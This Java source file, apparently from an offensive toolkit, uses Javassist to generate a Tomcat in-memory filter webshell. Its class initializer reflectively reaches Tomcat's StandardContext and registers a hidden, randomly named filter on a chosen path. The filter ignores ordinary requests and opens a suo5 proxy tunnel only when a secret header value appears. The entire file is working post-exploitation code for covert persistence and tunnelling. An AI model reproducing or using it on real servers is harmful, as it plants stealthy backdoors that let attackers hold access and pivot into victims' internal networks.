package com.mechoy.memshell.suo5;

import javassist.*;

import java.io.IOException;
import java.util.UUID;

public class Suo5TomcatFilterProxy {
    public static byte[] generateListenerMemShell(String path, String headerKey, String headerValue) throws CannotCompileException, NotFoundException, IOException {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("com.mechoy.memshell.suo5.template.Suo5Template");

        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");
        String className = "A" + replace;

        // 修改类名和包名
        ctClass.setName(className);

        // 实现接口
        CtClass handlerInterceptor = pool.get("javax.servlet.Filter");
        ctClass.setInterfaces(new CtClass[]{handlerInterceptor});

        // 实现init方法
        CtMethod init = CtNewMethod.make("public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {}", ctClass);
        ctClass.addMethod(init);

        // 实现destroy方法
        CtMethod destroy = CtNewMethod.make("public void destroy() {}", ctClass);
        ctClass.addMethod(destroy);

        // 实现doFilter方法
        CtMethod doFilter = CtNewMethod.make("public void doFilter(javax.servlet.ServletRequest sReq, javax.servlet.ServletResponse sResp, javax.servlet.FilterChain chain) throws java.io.IOException, javax.servlet.ServletException {\n" +
                "        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) sReq;\n" +
                "        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) sResp;\n" +
                "        String agent = request.getHeader(\"" + headerKey + "\");\n" +
                "        String contentType = request.getHeader(\"Content-Type\");\n" +
                "        if (agent == null || !agent.contains(\"" + headerValue + "\")) {\n" +
                "            if (chain != null) {\n" +
                "                chain.doFilter(sReq, sResp);\n" +
                "            }\n" +
                "            return;\n" +
                "        }\n" +
                "        if (contentType == null) {\n" +
                "            return;\n" +
                "        }\n" +
                "        try {\n" +
                "            if (contentType.equals(\"application/plain\")) {\n" +
                "                tryFullDuplex(request, response);\n" +
                "                return;\n" +
                "            }\n" +
                "            if (contentType.equals(\"application/octet-stream\")) {\n" +
                "                processDataBio(request, response);\n" +
                "            } else {\n" +
                "                processDataUnary(request, response);\n" +
                "            }\n" +
                "        } catch (Throwable e) {\n" +
                "                e.printStackTrace();\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(doFilter);

        // 创建静态方法块
        ctClass.makeClassInitializer().insertBefore("try {\n" +
                "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = ((org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader());\n" +
                "            java.lang.reflect.Field resources = Class.forName(\"org.apache.catalina.loader.WebappClassLoaderBase\").getDeclaredField(\"resources\");\n" +
                "            resources.setAccessible(true);\n" +
                "            org.apache.catalina.WebResourceRoot webResourceRoot = (org.apache.catalina.WebResourceRoot) resources.get(webappClassLoaderBase);\n" +
                "            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webResourceRoot.getContext();\n" +
                "            " + className + " " + className.toLowerCase() + " = new " + className + "();\n" +
                "            org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();\n" +
                "            filterDef.setFilter(" + className.toLowerCase() + ");\n " +
                "            filterDef.setFilterClass(" + className.toLowerCase() + ".getClass().getName());\n" +
                "            filterDef.setFilterName(\"" + className + "\");\n" +
                "            standardContext.addFilterDef(filterDef);\n" +
                "            org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();\n" +
                "            filterMap.setFilterName(\"" + className + "\");\n" +
                "            filterMap.addURLPattern(\"" + path + "\");\n" +
                "            standardContext.addFilterMap(filterMap);\n" +
                "            java.lang.reflect.Field configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n" +
                "            configs.setAccessible(true);\n" +
                "            java.util.HashMap filterConfigs = (java.util.HashMap) configs.get(standardContext);\n" +
                "            java.lang.Class applicationFilterConfigClass = java.lang.Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\");\n" +
                "            java.lang.reflect.Constructor declaredConstructor = applicationFilterConfigClass.getDeclaredConstructor(new Class[]{org.apache.catalina.Context.class, org.apache.tomcat.util.descriptor.web.FilterDef.class});\n" +
                "            declaredConstructor.setAccessible(true);\n" +
                "            org.apache.catalina.core.ApplicationFilterConfig applicationFilterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor.newInstance(new Object[]{standardContext, filterDef});\n" +
                "            filterConfigs.put(\"" + className + "\", applicationFilterConfig);\n" +
                "        } catch (Exception e) {\n" +
                "            throw new RuntimeException(e);\n" +
                "        }");

        return ctClass.toBytecode();
    }
}
